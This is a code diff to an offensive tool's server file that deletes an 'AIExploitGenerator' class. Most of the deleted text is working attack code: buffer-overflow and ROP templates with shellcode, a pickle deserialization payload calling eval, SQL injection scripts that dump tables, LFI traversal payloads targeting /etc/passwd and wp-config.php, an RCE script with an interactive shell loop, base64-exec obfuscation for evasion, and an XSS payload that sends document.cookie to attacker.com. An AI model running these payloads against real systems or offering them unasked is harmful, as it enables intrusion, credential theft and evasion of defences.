+++ hexstrike_server.py
@@ -18,7 +18,6 @@ import sys
 import traceback
 import threading
 import time
-import base64
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime, timedelta
 from typing import Dict, Any, Optional
@@ -3053,1490 +3052,7 @@ class EnhancedCommandExecutor:
 #
 # ============================================================================
 
-
-
-class AIExploitGenerator:
-    """AI-powered exploit development and enhancement system"""
-
-    def __init__(self):
-        # Extend existing payload templates
-        self.exploit_templates = {
-            "buffer_overflow": {
-                "x86": """
-# Buffer Overflow Exploit Template for {cve_id}
-# Target: {target_info}
-# Architecture: x86
-
-import struct
-import socket
-
-def create_exploit():
-    # Vulnerability details from {cve_id}
-    target_ip = "{target_ip}"
-    target_port = {target_port}
-
-    # Buffer overflow payload
-    padding = "A" * {offset}
-    eip_control = struct.pack("<I", {ret_address})
-    nop_sled = "\\x90" * {nop_size}
-
-    # Shellcode ({shellcode_type})
-    shellcode = {shellcode}
-
-    exploit = padding + eip_control + nop_sled + shellcode
-    return exploit
-
-if __name__ == "__main__":
-    payload = create_exploit()
-    print(f"Exploit payload generated for {cve_id}")
-    print(f"Payload size: {{len(payload)}} bytes")
-                """,
-                "x64": """
-# 64-bit Buffer Overflow Exploit Template for {cve_id}
-# Target: {target_info}
-# Architecture: x64
-
-import struct
-import socket
-
-def create_rop_exploit():
-    target_ip = "{target_ip}"
-    target_port = {target_port}
-
-    # ROP chain for x64 exploitation
-    padding = "A" * {offset}
-    rop_chain = [
-        {rop_gadgets}
-    ]
-
-    rop_payload = "".join([struct.pack("<Q", addr) for addr in rop_chain])
-    shellcode = {shellcode}
-
-    exploit = padding + rop_payload + shellcode
-    return exploit
-                """
-            },
-            "web_rce": """
-# Web-based RCE Exploit for {cve_id}
-# Target: {target_info}
-
-import requests
-import sys
-
-def exploit_rce(target_url, command):
-    # CVE {cve_id} exploitation
-    headers = {{
-        "User-Agent": "Mozilla/5.0 (Compatible Exploit)",
-        "Content-Type": "{content_type}"
-    }}
-
-    # Injection payload
-    payload = {injection_payload}
-
-    try:
-        response = requests.post(target_url, data=payload, headers=headers, timeout=10)
-        if response.status_code == 200:
-            return response.text
-    except Exception as e:
-        print(f"Exploit failed: {{e}}")
-
-    return None
-
-if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python exploit.py <target_url> <command>")
-        sys.exit(1)
-
-    result = exploit_rce(sys.argv[1], sys.argv[2])
-    if result:
-        print("Exploit successful!")
-        print(result)
-            """,
-            "deserialization": """
-# Deserialization Exploit for {cve_id}
-# Target: {target_info}
-
-import pickle
-import base64
-import requests
-
-class ExploitPayload:
-    def __reduce__(self):
-        return (eval, ('{command}',))
-
-def create_malicious_payload(command):
-    payload = ExploitPayload()
-    serialized = pickle.dumps(payload)
-    encoded = base64.b64encode(serialized).decode()
-    return encoded
-
-def send_exploit(target_url, command):
-    payload = create_malicious_payload(command)
-
-    data = {{
-        "{parameter_name}": payload
-    }}
-
-    response = requests.post(target_url, data=data)
-    return response.text
-            """
-        }
-
-        self.evasion_techniques = {
-            "encoding": ["url", "base64", "hex", "unicode"],
-            "obfuscation": ["variable_renaming", "string_splitting", "comment_injection"],
-            "av_evasion": ["encryption", "packing", "metamorphism"],
-            "waf_bypass": ["case_variation", "parameter_pollution", "header_manipulation"]
-        }
-
-    def generate_exploit_from_cve(self, cve_data, target_info):
-        """Generate working exploit from real CVE data with specific implementation"""
-        try:
-            cve_id = cve_data.get("cve_id", "")
-            description = cve_data.get("description", "").lower()
-            
-            logger.info(f"🛠️ Generating specific exploit for {cve_id}")
-
-            # Enhanced vulnerability classification using real CVE data
-            vuln_type, specific_details = self._analyze_vulnerability_details(description, cve_data)
-            
-            # Generate real, specific exploit based on CVE details
-            if vuln_type == "sql_injection":
-                exploit_code = self._generate_sql_injection_exploit(cve_data, target_info, specific_details)
-            elif vuln_type == "xss":
-                exploit_code = self._generate_xss_exploit(cve_data, target_info, specific_details)
-            elif vuln_type == "rce" or vuln_type == "web_rce":
-                exploit_code = self._generate_rce_exploit(cve_data, target_info, specific_details)
-            elif vuln_type == "xxe":
-                exploit_code = self._generate_xxe_exploit(cve_data, target_info, specific_details)
-            elif vuln_type == "deserialization":
-                exploit_code = self._generate_deserialization_exploit(cve_data, target_info, specific_details)
-            elif vuln_type == "file_read" or vuln_type == "directory_traversal":
-                exploit_code = self._generate_file_read_exploit(cve_data, target_info, specific_details)
-            elif vuln_type == "authentication_bypass":
-                exploit_code = self._generate_auth_bypass_exploit(cve_data, target_info, specific_details)
-            elif vuln_type == "buffer_overflow":
-                exploit_code = self._generate_buffer_overflow_exploit(cve_data, target_info, specific_details)
-            else:
-                # Fallback to intelligent generic exploit
-                exploit_code = self._generate_intelligent_generic_exploit(cve_data, target_info, specific_details)
-
-            # Apply evasion techniques if requested
-            if target_info.get("evasion_level", "none") != "none":
-                exploit_code = self._apply_evasion_techniques(exploit_code, target_info)
-
-            # Generate specific usage instructions
-            instructions = self._generate_specific_instructions(vuln_type, cve_data, target_info, specific_details)
-
-            return {
-                "success": True,
-                "cve_id": cve_id,
-                "vulnerability_type": vuln_type,
-                "specific_details": specific_details,
-                "exploit_code": exploit_code,
-                "instructions": instructions,
-                "evasion_applied": target_info.get("evasion_level", "none"),
-                "implementation_type": "real_cve_based"
-            }
-
-        except Exception as e:
-            logger.error(f"💥 Error generating exploit for {cve_data.get('cve_id', 'unknown')}: {str(e)}")
-            return {"success": False, "error": str(e)}
-
-    def _classify_vulnerability(self, description):
-        """Classify vulnerability type from description"""
-        if any(keyword in description for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
-            return "buffer_overflow"
-        elif any(keyword in description for keyword in ["code execution", "command injection", "rce"]):
-            return "web_rce"
-        elif any(keyword in description for keyword in ["deserialization", "unserialize", "pickle"]):
-            return "deserialization"
-        elif any(keyword in description for keyword in ["sql injection", "sqli"]):
-            return "sql_injection"
-        elif any(keyword in description for keyword in ["xss", "cross-site scripting"]):
-            return "xss"
-        else:
-            return "generic"
-
-    def _select_template(self, vuln_type, target_info):
-        """Select appropriate exploit template"""
-        if vuln_type == "buffer_overflow":
-            arch = target_info.get("target_arch", "x86")
-            return self.exploit_templates["buffer_overflow"].get(arch,
-                   self.exploit_templates["buffer_overflow"]["x86"])
-        elif vuln_type in self.exploit_templates:
-            return self.exploit_templates[vuln_type]
-        else:
-            return "# Generic exploit template for {cve_id}\n# Manual development required"
-
-    def _generate_exploit_parameters(self, cve_data, target_info, vuln_type):
-        """Generate parameters for exploit template"""
-        params = {
-            "cve_id": cve_data.get("cve_id", ""),
-            "target_info": target_info.get("description", "Unknown target"),
-            "target_ip": target_info.get("target_ip", "192.168.1.100"),
-            "target_port": target_info.get("target_port", 80),
-            "command": target_info.get("command", "id"),
-        }
-
-        if vuln_type == "buffer_overflow":
-            params.update({
-                "offset": target_info.get("offset", 268),
-                "ret_address": target_info.get("ret_address", "0x41414141"),
-                "nop_size": target_info.get("nop_size", 16),
-                "shellcode": target_info.get("shellcode", '"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"'),
-                "shellcode_type": target_info.get("shellcode_type", "linux/x86/exec"),
-                "rop_gadgets": target_info.get("rop_gadgets", "0x41414141, 0x42424242")
-            })
-        elif vuln_type == "web_rce":
-            params.update({
-                "content_type": target_info.get("content_type", "application/x-www-form-urlencoded"),
-                "injection_payload": target_info.get("injection_payload", '{"cmd": command}'),
-                "parameter_name": target_info.get("parameter_name", "data")
-            })
-
-        return params
-
-    def _apply_evasion_techniques(self, exploit_code, target_info):
-        """Apply evasion techniques to exploit code"""
-        evasion_level = target_info.get("evasion_level", "basic")
-
-        if evasion_level == "basic":
-            # Simple string obfuscation
-            exploit_code = exploit_code.replace('"', "'")
-            exploit_code = f"# Obfuscated exploit\n{exploit_code}"
-        elif evasion_level == "advanced":
-            # Advanced obfuscation
-            exploit_code = self._advanced_obfuscation(exploit_code)
-
-        return exploit_code
-
-    def _advanced_obfuscation(self, code):
-        """Apply advanced obfuscation techniques"""
-        # This is a simplified version - real implementation would be more sophisticated
-        obfuscated = f"""
-# Advanced evasion techniques applied
-import base64
-exec(base64.b64decode('{base64.b64encode(code.encode()).decode()}'))
-        """
-        return obfuscated
-
-    def _analyze_vulnerability_details(self, description, cve_data):
-        """Analyze CVE data to extract specific vulnerability details"""
-        import re  # Import at the top of the method
-        
-        vuln_type = "generic"
-        specific_details = {
-            "endpoints": [],
-            "parameters": [],
-            "payload_location": "unknown",
-            "software": "unknown",
-            "version": "unknown",
-            "attack_vector": "unknown"
-        }
-        
-        # Extract specific details from description
-        description_lower = description.lower()
-        
-        # SQL Injection detection and details
-        if any(keyword in description_lower for keyword in ["sql injection", "sqli"]):
-            vuln_type = "sql_injection"
-            # Extract endpoint from description
-            endpoint_match = re.search(r'(/[^\s]+\.php[^\s]*)', description)
-            if endpoint_match:
-                specific_details["endpoints"] = [endpoint_match.group(1)]
-            # Extract parameter names
-            param_matches = re.findall(r'(?:via|parameter|param)\s+([a-zA-Z_][a-zA-Z0-9_]*)', description)
-            if param_matches:
-                specific_details["parameters"] = param_matches
-                
-        # XSS detection
-        elif any(keyword in description_lower for keyword in ["cross-site scripting", "xss"]):
-            vuln_type = "xss"
-            # Extract XSS context
-            if "stored" in description_lower:
-                specific_details["xss_type"] = "stored"
-            elif "reflected" in description_lower:
-                specific_details["xss_type"] = "reflected"
-            else:
-                specific_details["xss_type"] = "unknown"
-                
-        # XXE detection
-        elif any(keyword in description_lower for keyword in ["xxe", "xml external entity"]):
-            vuln_type = "xxe"
-            specific_details["payload_location"] = "xml"
-            
-        # File read/traversal detection
-        elif any(keyword in description_lower for keyword in ["file read", "directory traversal", "path traversal", "arbitrary file", "file disclosure", "local file inclusion", "lfi", "file inclusion"]):
-            vuln_type = "file_read"
-            if "directory traversal" in description_lower or "path traversal" in description_lower:
-                specific_details["traversal_type"] = "directory"
-            elif "local file inclusion" in description_lower or "lfi" in description_lower:
-                specific_details["traversal_type"] = "lfi"
-            else:
-                specific_details["traversal_type"] = "file_read"
-            
-            # Extract parameter names for LFI
-            param_matches = re.findall(r'(?:via|parameter|param)\s+([a-zA-Z_][a-zA-Z0-9_]*)', description)
-            if param_matches:
-                specific_details["parameters"] = param_matches
-                
-        # Authentication bypass
-        elif any(keyword in description_lower for keyword in ["authentication bypass", "auth bypass", "login bypass"]):
-            vuln_type = "authentication_bypass"
-            
-        # RCE detection
-        elif any(keyword in description_lower for keyword in ["remote code execution", "rce", "command injection"]):
-            vuln_type = "rce"
-            
-        # Deserialization
-        elif any(keyword in description_lower for keyword in ["deserialization", "unserialize", "pickle"]):
-            vuln_type = "deserialization"
-            
-        # Buffer overflow
-        elif any(keyword in description_lower for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
-            vuln_type = "buffer_overflow"
-            
-        # Extract software and version info
-        software_match = re.search(r'(\w+(?:\s+\w+)*)\s+v?(\d+(?:\.\d+)*)', description)
-        if software_match:
-            specific_details["software"] = software_match.group(1)
-            specific_details["version"] = software_match.group(2)
-            
-        return vuln_type, specific_details
-
-    def _generate_sql_injection_exploit(self, cve_data, target_info, details):
-        """Generate specific SQL injection exploit based on CVE details"""
-        cve_id = cve_data.get("cve_id", "")
-        endpoint = details.get("endpoints", ["/vulnerable.php"])[0] if details.get("endpoints") else "/vulnerable.php"
-        parameter = details.get("parameters", ["id"])[0] if details.get("parameters") else "id"
-        
-        return f'''#!/usr/bin/env python3
-# SQL Injection Exploit for {cve_id}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
-# Target: {details.get("software", "Unknown")} {details.get("version", "")}
-
-import requests
-import sys
-import time
-from urllib.parse import quote
-
-class SQLiExploit:
-    def __init__(self, target_url):
-        self.target_url = target_url.rstrip('/')
-        self.endpoint = "{endpoint}"
-        self.parameter = "{parameter}"
-        self.session = requests.Session()
-        
-    def test_injection(self):
-        """Test if target is vulnerable"""
-        print(f"[+] Testing SQL injection on {{self.target_url}}{{self.endpoint}}")
-        
-        # Time-based blind SQL injection test
-        payloads = [
-            "1' AND SLEEP(3)--",
-            "1' OR SLEEP(3)--",
-            "1'; WAITFOR DELAY '00:00:03'--"
-        ]
-        
-        for payload in payloads:
-            start_time = time.time()
-            try:
-                response = self.session.get(
-                    f"{{self.target_url}}{{self.endpoint}}",
-                    params={{self.parameter: payload}},
-                    timeout=10
-                )
-                elapsed = time.time() - start_time
-                
-                if elapsed >= 3:
-                    print(f"[+] Vulnerable! Payload: {{payload}}")
-                    return True
-                    
-            except requests.exceptions.Timeout:
-                print(f"[+] Likely vulnerable (timeout): {{payload}}")
-                return True
-            except Exception as e:
-                continue
-                
-        return False
-    
-    def extract_database_info(self):
-        """Extract database information"""
-        print("[+] Extracting database information...")
-        
-        queries = {{
-            "version": "SELECT VERSION()",
-            "user": "SELECT USER()",
-            "database": "SELECT DATABASE()"
-        }}
-        
-        results = {{}}
-        
-        for info_type, query in queries.items():
-            payload = f"1' UNION SELECT 1,({query}),3--"
-            try:
-                response = self.session.get(
-                    f"{{self.target_url}}{{self.endpoint}}",
-                    params={{self.parameter: payload}}
-                )
-                
-                # Simple extraction (would need customization per application)
-                if response.status_code == 200:
-                    results[info_type] = "Check response manually"
-                    print(f"[+] {{info_type.title()}}: Check response for {{query}}")
-                    
-            except Exception as e:
-                print(f"[-] Error extracting {{info_type}}: {{e}}")
-                
-        return results
-    
-    def dump_tables(self):
-        """Dump table names"""
-        print("[+] Attempting to dump table names...")
-        
-        # MySQL/MariaDB
-        payload = "1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
-        
-        try:
-            response = self.session.get(
-                f"{{self.target_url}}{{self.endpoint}}",
-                params={{self.parameter: payload}}
-            )
-            
-            if response.status_code == 200:
-                print("[+] Tables dumped - check response")
-                return response.text
-                
-        except Exception as e:
-            print(f"[-] Error dumping tables: {{e}}")
-            
-        return None
-
-def main():
-    if len(sys.argv) != 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com")
-        sys.exit(1)
-    
-    target_url = sys.argv[1]
-    exploit = SQLiExploit(target_url)
-    
-    print(f"[+] SQL Injection Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
-    
-    if exploit.test_injection():
-        print("[+] Target appears vulnerable!")
-        exploit.extract_database_info()
-        exploit.dump_tables()
-    else:
-        print("[-] Target does not appear vulnerable")
-
-if __name__ == "__main__":
-    main()
-'''
-
-    def _generate_xss_exploit(self, cve_data, target_info, details):
-        """Generate specific XSS exploit based on CVE details"""
-        cve_id = cve_data.get("cve_id", "")
-        xss_type = details.get("xss_type", "reflected")
-        
-        return f'''#!/usr/bin/env python3
-# Cross-Site Scripting (XSS) Exploit for {cve_id}
-# Type: {xss_type.title()} XSS
-# Vulnerability: {cve_data.get("description", "")[:100]}...
-
-import requests
-import sys
-from urllib.parse import quote
-
-class XSSExploit:
-    def __init__(self, target_url):
-        self.target_url = target_url.rstrip('/')
-        self.session = requests.Session()
-        
-    def generate_payloads(self):
-        """Generate XSS payloads for testing"""
-        payloads = [
-            # Basic XSS
-            "<script>alert('XSS-{cve_id}')</script>",
-            "<img src=x onerror=alert('XSS-{cve_id}')>",
-            "<svg onload=alert('XSS-{cve_id}')>",
-            
-            # Bypass attempts
-            "<script>alert(String.fromCharCode(88,83,83))</script>",
-            "javascript:alert('XSS-{cve_id}')",
-            "<iframe src=javascript:alert('XSS-{cve_id}')></iframe>",
-            
-            # Advanced payloads
-            "<script>fetch('/admin').then(r=>r.text()).then(d=>alert(d.substr(0,100)))</script>",
-            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
-        ]
-        
-        return payloads
-    
-    def test_reflected_xss(self, parameter="q"):
-        """Test for reflected XSS"""
-        print(f"[+] Testing reflected XSS on parameter: {{parameter}}")
-        
-        payloads = self.generate_payloads()
-        
-        for i, payload in enumerate(payloads):
-            try:
-                response = self.session.get(
-                    self.target_url,
-                    params={{parameter: payload}}
-                )
-                
-                if payload in response.text:
-                    print(f"[+] Potential XSS found with payload {{i+1}}: {{payload[:50]}}...")
-                    return True
-                    
-            except Exception as e:
-                print(f"[-] Error testing payload {{i+1}}: {{e}}")
-                continue
-                
-        return False
-    
-    def test_stored_xss(self, endpoint="/comment", data_param="comment"):
-        """Test for stored XSS"""
-        print(f"[+] Testing stored XSS on endpoint: {{endpoint}}")
-        
-        payloads = self.generate_payloads()
-        
-        for i, payload in enumerate(payloads):
-            try:
-                # Submit payload
-                response = self.session.post(
-                    f"{{self.target_url}}{{endpoint}}",
-                    data={{data_param: payload}}
-                )
-                
-                # Check if stored
-                check_response = self.session.get(self.target_url)
-                if payload in check_response.text:
-                    print(f"[+] Stored XSS found with payload {{i+1}}: {{payload[:50]}}...")
-                    return True
-                    
-            except Exception as e:
-                print(f"[-] Error testing stored payload {{i+1}}: {{e}}")
-                continue
-                
-        return False
-
-def main():
-    if len(sys.argv) < 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [parameter]")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com/search q")
-        sys.exit(1)
-    
-    target_url = sys.argv[1]
-    parameter = sys.argv[2] if len(sys.argv) > 2 else "q"
-    
-    exploit = XSSExploit(target_url)
-    
-    print(f"[+] XSS Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
-    
-    if "{xss_type}" == "reflected" or "{xss_type}" == "unknown":
-        if exploit.test_reflected_xss(parameter):
-            print("[+] Reflected XSS vulnerability confirmed!")
-        else:
-            print("[-] No reflected XSS found")
-    
-    if "{xss_type}" == "stored" or "{xss_type}" == "unknown":
-        if exploit.test_stored_xss():
-            print("[+] Stored XSS vulnerability confirmed!")
-        else:
-            print("[-] No stored XSS found")
-
-if __name__ == "__main__":
-    main()
-'''
-
-    def _generate_file_read_exploit(self, cve_data, target_info, details):
-        """Generate file read/directory traversal exploit"""
-        cve_id = cve_data.get("cve_id", "")
-        parameter = details.get("parameters", ["portal_type"])[0] if details.get("parameters") else "portal_type"
-        traversal_type = details.get("traversal_type", "file_read")
-        
-        return f'''#!/usr/bin/env python3
-# Local File Inclusion (LFI) Exploit for {cve_id}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
-# Parameter: {parameter}
-# Type: {traversal_type}
-
-import requests
-import sys
-from urllib.parse import quote
-
-class FileReadExploit:
-    def __init__(self, target_url):
-        self.target_url = target_url.rstrip('/')
-        self.session = requests.Session()
-        
-    def generate_payloads(self, target_file="/etc/passwd"):
-        """Generate directory traversal payloads"""
-        payloads = [
-            # Basic traversal
-            "../" * 10 + target_file.lstrip('/'),
-            "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
-            
-            # URL encoded
-            quote("../") * 10 + target_file.lstrip('/'),
-            
-            # Double encoding
-            quote(quote("../")) * 10 + target_file.lstrip('/'),
-            
-            # Null byte (for older systems)
-            "../" * 10 + target_file.lstrip('/') + "%00.txt",
-            
-            # Absolute paths
-            target_file,
-            "file://" + target_file,
-            
-            # Windows paths
-            "C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
-            "C:/windows/system32/drivers/etc/hosts"
-        ]
-        
-        return payloads
-    
-    def test_file_read(self, parameter="{parameter}"):
-        """Test LFI vulnerability on WordPress"""
-        print(f"[+] Testing LFI on parameter: {{parameter}}")
-        
-        # WordPress-specific files and common targets
-        test_files = [
-            "/etc/passwd",
-            "/etc/hosts", 
-            "/proc/version",
-            "/var/www/html/wp-config.php",
-            "/var/log/apache2/access.log",
-            "/var/log/nginx/access.log",
-            "../../../../etc/passwd",
-            "php://filter/convert.base64-encode/resource=wp-config.php"
-        ]
-        
-        for target_file in test_files:
-            payloads = self.generate_payloads(target_file)
-            
-            for i, payload in enumerate(payloads):
-                try:
-                    response = self.session.get(
-                        self.target_url,
-                        params={{parameter: payload}}
-                    )
-                    
-                    # Check for common file contents
-                    indicators = [
-                        "root:", "daemon:", "bin:", "sys:",  # /etc/passwd
-                        "localhost", "127.0.0.1",  # hosts file
-                        "Linux version", "Microsoft Windows",  # system info
-                        "<?php", "#!/bin/"  # code files
-                    ]
-                    
-                    if any(indicator in response.text for indicator in indicators):
-                        print(f"[+] File read successful!")
-                        print(f"[+] File: {{target_file}}")
-                        print(f"[+] Payload: {{payload}}")
-                        print(f"[+] Content preview: {{response.text[:200]}}...")
-                        return True
-                        
-                except Exception as e:
-                    continue
-                    
-        return False
-    
-    def read_specific_file(self, filepath, parameter="file"):
-        """Read a specific file"""
-        print(f"[+] Attempting to read: {{filepath}}")
-        
-        payloads = self.generate_payloads(filepath)
-        
-        for payload in payloads:
-            try:
-                response = self.session.get(
-                    self.target_url,
-                    params={{parameter: payload}}
-                )
-                
-                if response.status_code == 200 and len(response.text) > 10:
-                    print(f"[+] Successfully read {{filepath}}:")
-                    print("-" * 50)
-                    print(response.text)
-                    print("-" * 50)
-                    return response.text
-                    
-            except Exception as e:
-                continue
-                
-        print(f"[-] Could not read {{filepath}}")
-        return None
-
-def main():
-    if len(sys.argv) < 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [parameter] [file_to_read]")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com/view file /etc/passwd")
-        sys.exit(1)
-    
-    target_url = sys.argv[1]
-    parameter = sys.argv[2] if len(sys.argv) > 2 else "file"
-    specific_file = sys.argv[3] if len(sys.argv) > 3 else None
-    
-    exploit = FileReadExploit(target_url)
-    
-    print(f"[+] File Read Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
-    
-    if specific_file:
-        exploit.read_specific_file(specific_file, parameter)
-    else:
-        if exploit.test_file_read(parameter):
-            print("[+] File read vulnerability confirmed!")
-        else:
-            print("[-] No file read vulnerability found")
-
-if __name__ == "__main__":
-    main()
-'''
-
-    def _generate_intelligent_generic_exploit(self, cve_data, target_info, details):
-        """Generate intelligent generic exploit based on CVE analysis"""
-        cve_id = cve_data.get("cve_id", "")
-        description = cve_data.get("description", "")
-        
-        return f'''#!/usr/bin/env python3
-# Generic Exploit for {cve_id}
-# Vulnerability: {description[:150]}...
-# Generated based on CVE analysis
-
-import requests
-import sys
-import json
-
-class GenericExploit:
-    def __init__(self, target_url):
-        self.target_url = target_url.rstrip('/')
-        self.session = requests.Session()
-        self.cve_id = "{cve_id}"
-        
-    def analyze_target(self):
-        """Analyze target for vulnerability indicators"""
-        print(f"[+] Analyzing target for {cve_id}")
-        
-        try:
-            response = self.session.get(self.target_url)
-            
-            # Look for version indicators in response
-            headers = response.headers
-            content = response.text.lower()
-            
-            print(f"[+] Server: {{headers.get('Server', 'Unknown')}}")
-            print(f"[+] Status Code: {{response.status_code}}")
-            
-            # Check for software indicators
-            software_indicators = [
-                "{details.get('software', '').lower()}",
-                "version {details.get('version', '')}",
-            ]
-            
-            for indicator in software_indicators:
-                if indicator and indicator in content:
-                    print(f"[+] Found software indicator: {{indicator}}")
-                    return True
-                    
-        except Exception as e:
-            print(f"[-] Error analyzing target: {{e}}")
-            
-        return False
-    
-    def test_vulnerability(self):
-        """Test for vulnerability presence"""
-        print(f"[+] Testing for {cve_id} vulnerability...")
-        
-        # Based on CVE description, generate test cases
-        test_endpoints = [
-            "/",
-            "/admin",
-            "/api",
-            "/login"
-        ]
-        
-        for endpoint in test_endpoints:
-            try:
-                response = self.session.get(f"{{self.target_url}}{{endpoint}}")
-                print(f"[+] {{endpoint}}: {{response.status_code}}")
-                
-                # Look for error messages or indicators
-                if response.status_code in [200, 500, 403]:
-                    print(f"[+] Endpoint {{endpoint}} accessible")
-                    
-            except Exception as e:
-                continue
-                
-        return True
-    
-    def exploit(self):
-        """Attempt exploitation based on CVE details"""
-        print(f"[+] Attempting exploitation of {cve_id}")
-        
-        # This would be customized based on the specific CVE
-        print(f"[!] Manual exploitation required for {cve_id}")
-        print(f"[!] Vulnerability details: {{'{description[:200]}...'}}")
-        
-        return False
-
-def main():
-    if len(sys.argv) != 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com")
-        sys.exit(1)
-    
-    target_url = sys.argv[1]
-    exploit = GenericExploit(target_url)
-    
-    print(f"[+] Generic Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
-    
-    if exploit.analyze_target():
-        print("[+] Target may be vulnerable")
-        exploit.test_vulnerability()
-        exploit.exploit()
-    else:
-        print("[-] Target does not appear to match vulnerability profile")
-
-if __name__ == "__main__":
-    main()
-'''
-
-    def _generate_specific_instructions(self, vuln_type, cve_data, target_info, details):
-        """Generate specific usage instructions based on vulnerability type"""
-        cve_id = cve_data.get("cve_id", "")
-        
-        base_instructions = f"""# Exploit for {cve_id}
-# Vulnerability Type: {vuln_type}
-# Software: {details.get('software', 'Unknown')} {details.get('version', '')}
-
-## Vulnerability Details:
-{cve_data.get('description', 'No description available')[:300]}...
-
-## Usage Instructions:
-1. Ensure target is running vulnerable software version
-2. Test in authorized environment only
-3. Adjust parameters based on target configuration
-4. Monitor for defensive responses
-
-## Basic Usage:
-python3 exploit.py <target_url>"""
-
-        if vuln_type == "sql_injection":
-            return base_instructions + f"""
-
-## SQL Injection Specific:
-- Parameter: {details.get('parameters', ['unknown'])[0]}
-- Endpoint: {details.get('endpoints', ['unknown'])[0]}
-- Test with: python3 exploit.py http://target.com
-- The script will automatically test for time-based blind SQL injection
-- If successful, it will attempt to extract database information
-
-## Manual Testing:
-- Add ' after parameter value to test for errors
-- Use SLEEP() or WAITFOR DELAY for time-based testing
-- Try UNION SELECT for data extraction"""
-
-        elif vuln_type == "xss":
-            return base_instructions + f"""
-
-## XSS Specific:
-- Type: {details.get('xss_type', 'unknown')}
-- Test with: python3 exploit.py http://target.com parameter_name
-- The script tests both reflected and stored XSS
-- Payloads include basic and advanced bypass techniques
-
-## Manual Testing:
-- Try <script>alert('XSS')</script>
-- Use event handlers: <img src=x onerror=alert('XSS')>
-- Test for filter bypasses"""
-
-        elif vuln_type == "file_read":
-            return base_instructions + f"""
-
-## File Read/Directory Traversal:
-- Test with: python3 exploit.py http://target.com file_parameter
-- Automatically tests common files (/etc/passwd, etc.)
-- Includes encoding and bypass techniques
-
-## Manual Testing:
-- Try ../../../etc/passwd
-- Test Windows paths: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
-- Use URL encoding for bypasses"""
-
-        return base_instructions + f"""
-
-## General Testing:
-- Run: python3 exploit.py <target_url>
-- Check target software version matches vulnerable range
-- Monitor application logs for exploitation attempts
-- Verify patch status before testing"""
-
-    def _generate_rce_exploit(self, cve_data, target_info, details):
-        """Generate RCE exploit based on CVE details"""
-        cve_id = cve_data.get("cve_id", "")
-        
-        return f'''#!/usr/bin/env python3
-# Remote Code Execution Exploit for {cve_id}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
-
-import requests
-import sys
-import subprocess
-from urllib.parse import quote
-
-class RCEExploit:
-    def __init__(self, target_url):
-        self.target_url = target_url.rstrip('/')
-        self.session = requests.Session()
-        
-    def test_rce(self, command="id"):
-        """Test for RCE vulnerability"""
-        print(f"[+] Testing RCE with command: {{command}}")
-        
-        # Common RCE payloads
-        payloads = [
-            # Command injection
-            f"; {{command}}",
-            f"| {{command}}",
-            f"&& {{command}}",
-            f"|| {{command}}",
-            
-            # Template injection
-            f"${{{{{{command}}}}}}",
-            f"{{{{{{command}}}}}}",
-            
-            # Deserialization payloads
-            f"{{command}}",
-            
-            # OS command injection
-            f"`{{command}}`",
-            f"$({{command}})",
-        ]
-        
-        for i, payload in enumerate(payloads):
-            try:
-                # Test GET parameters
-                response = self.session.get(
-                    self.target_url,
-                    params={{"cmd": payload, "exec": payload, "system": payload}}
-                )
-                
-                # Look for command output indicators
-                if self._check_rce_indicators(response.text, command):
-                    print(f"[+] RCE found with payload {{i+1}}: {{payload}}")
-                    return True
-                
-                # Test POST data
-                response = self.session.post(
-                    self.target_url,
-                    data={{"cmd": payload, "exec": payload, "system": payload}}
-                )
-                
-                if self._check_rce_indicators(response.text, command):
-                    print(f"[+] RCE found with POST payload {{i+1}}: {{payload}}")
-                    return True
-                    
-            except Exception as e:
-                continue
-                
-        return False
-    
-    def _check_rce_indicators(self, response_text, command):
-        """Check response for RCE indicators"""
-        if command == "id":
-            indicators = ["uid=", "gid=", "groups="]
-        elif command == "whoami":
-            indicators = ["root", "www-data", "apache", "nginx"]
-        elif command == "pwd":
-            indicators = ["/", "\\\\", "C:"]
-        else:
-            indicators = [command]
-            
-        return any(indicator in response_text for indicator in indicators)
-    
-    def execute_command(self, command):
-        """Execute a specific command"""
-        print(f"[+] Executing command: {{command}}")
-        
-        if self.test_rce(command):
-            print(f"[+] Command executed successfully")
-            return True
-        else:
-            print(f"[-] Command execution failed")
-            return False
-
-def main():
-    if len(sys.argv) < 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [command]")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com id")
-        sys.exit(1)
-    
-    target_url = sys.argv[1]
-    command = sys.argv[2] if len(sys.argv) > 2 else "id"
-    
-    exploit = RCEExploit(target_url)
-    
-    print(f"[+] RCE Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
-    
-    if exploit.test_rce(command):
-        print("[+] RCE vulnerability confirmed!")
-        
-        # Interactive shell
-        while True:
-            try:
-                cmd = input("RCE> ").strip()
-                if cmd.lower() in ['exit', 'quit']:
-                    break
-                if cmd:
-                    exploit.execute_command(cmd)
-            except KeyboardInterrupt:
-                break
-    else:
-        print("[-] No RCE vulnerability found")
-
-if __name__ == "__main__":
-    main()
-'''
-
